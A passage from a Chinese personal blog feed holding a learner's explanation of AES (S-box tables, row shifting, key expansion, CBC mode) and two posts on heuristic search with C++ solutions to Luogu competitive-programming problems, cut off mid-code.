xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>那么它的逆表就是</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><p>比如在第一个表中可以看到0行0列是0x63，与之对应的，在第二张表的第6行第三列就是0x00，也就是0x63在第一个表中的位置。因为AES是对称加密，所以每一步操作都需要可逆。</p><h2 id="行位移"><a href="#行位移" class="headerlink" title="行位移"></a>行位移</h2><p>这里要说一下，AES分组是16个字节一组，在加密的过程中16字节会形成4x4的矩阵，字节按照以下顺序排列</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/3.png" alt="3"></p><p>行移位是一个简单的左循环移位操作。第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/4.png" alt="4"></p><p>逆变换当然也很简单，就不细讲了。</p><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><p>这个涉及到的知识比较多，我有点难以接受，mark一下，以后再补</p><p>就是说把它当成一个矩阵然后和另一个矩阵做乘法运算得到新的矩阵，至于逆过程就是对逆矩阵做乘法。然后这里面的加法就是异或，乘法会变成取模乘法。(应该是这样的)</p><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><p>这个很简单，就是扩展密钥，密钥输入了16字节，每组四个字节就是四组，第一组和第四组异或得到第五组，第二组和第五组异或得到第六组，第三组和第六组异或得到第七组，以此类推。因为要加密10次，所以扩展出四十组密钥。</p><p>然后就是很简单的了，列混淆得到的矩阵再和密钥异或一下即可。每次都和不一样的密钥做异或，一共十次，这就是AES。</p><h1 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h1><p>分组加密有一个缺点，分组之间独立，一样的数据不管在第几组都是一样的加密，如果我已只很多密文明文对，那么加密的信息很可能会被暴力破解出来，CBC就是用来对抗这个缺点的。CBC不通的就是，会有一个初始向量与第一组的数据进行异或，然后第二组的会和第一组异或加密前的数据异或再进行加密，以此类推，这样的话，分组之间将不再独立，改动前面的一个字节很可能导致整个密文发生巨大变化。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来学学AES。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="crypto" scheme="http://example.com/categories/ctf/crypto/"/>
    
    
  </entry>
  
  <entry>
    <title>启发式搜索算法进阶</title>
    <link href="http://example.com/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/"/>
    <id>http://example.com/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/</id>
    <published>2021-12-16T14:00:00.000Z</published>
    <updated>2021-12-16T18:26:20.630Z</updated>
    
    <content type="html"><![CDATA[<p>继续来学启发式搜索</p><span id="more"></span><p>多的其实没啥好讲了的，因为概念问题在前一篇博文已经讲的很清楚了。主要就是训练寻找估值函数，多点题目练习能应对不通场景下的启发式搜索。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>洛谷上的<a href="https://www.luogu.com.cn/problem/P2324">p2324骑士精神</a></p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="https://cdn.luogu.com.cn/upload/pic/1389.png" alt="1"></p><p>主要就是说有个空格，然后所有马都走日，没有马脚，只能跳到空格里面去，然后问你是否能在15步以内达到。如果可以则输出最短步数，否则输出-1，因为空格只有一个我们不考虑跳马，考虑跳空格。</p><p>递归最大深度15层能确定了，但是任意一个状态可以延伸出最少2中最多八种情况。15作为指数时间上还是遭不住，考虑启发式搜索。那么估值函数需要怎么写呢？</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里再补充点估值函数的知识。</p><p><em>f</em>(<em>n</em>)=<em>g</em>(<em>n</em>)+<em>h</em>(<em>n</em>)</p><p>估值函数一般表达式如上，g(n)为当前状态，h(n)为未来最优状态产生的花费，或者是其它。估值函数为两者和，由于当前状态我们很容易获取，所以算出未来最优状态即可等于获得了估值函数。可能前面讲的有点小问题，但是还是不妨碍的，因为我们平时写也基本是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">f</span>(n)+value&gt;ans)&#123;</span><br><span class="line"><span class="built_in">dfs</span>(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以问题不大。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>在本题中，我们的估值函数应该是算能到达目的状态的最小步数。那么这个怎么去考虑呢，其实可以拿当前状态与目标状态相比较，如果有两个点不符合目标状态，那么它们最优能达成目标状态一定是1，这里的最优指的是所有的这个情况下能达成目的状态的最小值。因为如果两个不符合的点不形成“日”字的关系，那么它们可能就不止需要1步了，但是估值并不是真的去计算真正的实际情况，估值函数需要尽可能的方便计算，这点很重要。</p><p>那么如果我们有三个点不一样那情况如何呢？那考虑最好的情况那还得是2步解决。所以我们很容易可以发现，假如当前状态与目标状态有n个点不一样，那么它最少需要n-1步来完成。</p><p>所以我们很容易可以写出估值函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当估值函数返回-1的时候说明当前已经符合目标状态了，那么这个将作为搜索终止条件，并更新最优解。</p><p>剩下的就是终归中距的dfs了。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> goal[<span class="number">5</span>][<span class="number">5</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> qipan[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;,dy[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>(step&gt;<span class="number">15</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">f</span>())&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,step);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> new_x=x+dx[i],new_y=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(new_x&lt;<span class="number">0</span>||new_x&gt;=<span class="number">5</span>||new_y&lt;<span class="number">0</span>||new_y&gt;=<span class="number">5</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">        <span class="keyword">if</span>(step+<span class="built_in">f</span>()&lt;=<span class="built_in">min</span>(ans,<span class="number">15</span>))&#123;</span><br><span class="line">            <span class="built_in">search</span>(new_x,new_y,step+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">int</span> start_x,start_y;</span><br><span class="line">    ans=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(s[j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=s[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=<span class="number">2</span>;</span><br><span class="line">                    start_x=j;</span><br><span class="line">                    start_y=i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ;</span><br><span class="line">                    <span class="built_in">perror</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">search</span>(start_x,start_y,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像不开氧气优化会被卡掉，我只能%氧气优化了，因为我实在不知道咋优化了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;继续来学启发式搜索&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="algorithm" scheme="http://example.com/categories/icpc/algorithm/"/>
    
    <category term="search" scheme="http://example.com/categories/icpc/algorithm/search/"/>
    
    
  </entry>
  
  <entry>
    <title>启发式搜索算法</title>
    <link href="http://example.com/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
    <id>http://example.com/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</id>
    <published>2021-12-15T14:00:00.000Z</published>
    <updated>2021-12-15T17:21:12.677Z</updated>
    
    <content type="html"><![CDATA[<p>来快乐学算法了。</p><span id="more"></span><h2 id="启发式搜索"><a href="#启发式搜索" class="headerlink" title="启发式搜索"></a>启发式搜索</h2><p>启发式搜索（英文：heuristic search）是一种改进的搜索算法。它在普通搜索算法的基础上引入了启发式函数，该函数的作用是基于已有的信息对搜索的每一个分支选择都做估价，进而选择分支。简单来说，启发式搜索就是对取和不取都做分析，从中选取更优解或删去无效解。</p><p>在此之前，本蒟蒻一直就只会dfs和bfs，今天来学学新的搜索算法。经过多重资料的 查阅也是大概得知启发式搜索的大概思路，每次搜索会对之后可能的最优状态估值，如果估出来的值不如当前某些状态，那么我就直接舍弃这个状态。就比如经典01背包问题，我对每一个物品的抉择都有选或者不选两种选择，我发现我不选这个物品，选其它物品所产生的最优解不如我当前选这个解的状态好，那么我直接考虑选择这个而不去搜索不选择这个物品的状态。</p><h3 id="估值函数"><a href="#估值函数" class="headerlink" title="估值函数"></a>估值函数</h3><p>这里需要解释一下我如何判断当前状态是否优于之后的最优状态，那么这里需要这么一个估值函数，估值函数不是真的对那个情况做具体分析，那样的话跟暴力没区别了。我这样考虑，如果剩下所有物品全能放进去都不如我一个放进去价值大，那么我肯定得放这个物品(前提是放得进去，放不进去就别讨论了)。那么这个剩下的所有物品的价值就是我这一个启发式搜索方案的估值函数。</p><p>假如有n样物品，那么在搜索第x样物品的估值函数就是</p><p>$f(x)=\sum _{i=x} ^{n} a[i]$</p><p>我在判断一下这个要不要放的时候我只需要看看我历史最优值是否小于当前最优值+估值函数值就可以了，如果成立那就说明这个可能可以不放，否则这个必须要放，因为如果不放的话，它剩下就算全放都没有我历史搜索出来的最优值大，那么我就没必要搜索不放的情况了。当然这是其中一种启发式搜索的办法。还有其它的方式，我们下面讲。</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><p>来自洛谷<a href="https://www.luogu.com.cn/problem/P1048">P1048 NOIP2005 普及组 采药</a></p><p>那么我按照我之前的启发式搜索方式得到了下面的算法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">int</span> v[maxn],c[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=c[now])</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-c[now],value+v[now]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;c[i],&amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以算出正确结果，但是有些点会T</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/1.png" alt="1"></p><p>事实上我这样的启发式搜索方法还是有点暴力，因为后面的物品可能完全一个都放不进去，但是价值很大，这样的数据启发式搜索就会退化成朴素算法。</p><p>那么我如果换一种，我不管什么就一个个放进去看看能有多少最大的价值，为了保证能朴素地算出最大值我们可以先对物品的单位价值排序然后一个个放，而且我们需要假设物品可以分割。那不然的话等于是在后面的物品做一次动态规划，复杂度还是比较高的。所以我们可以得出估值函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> 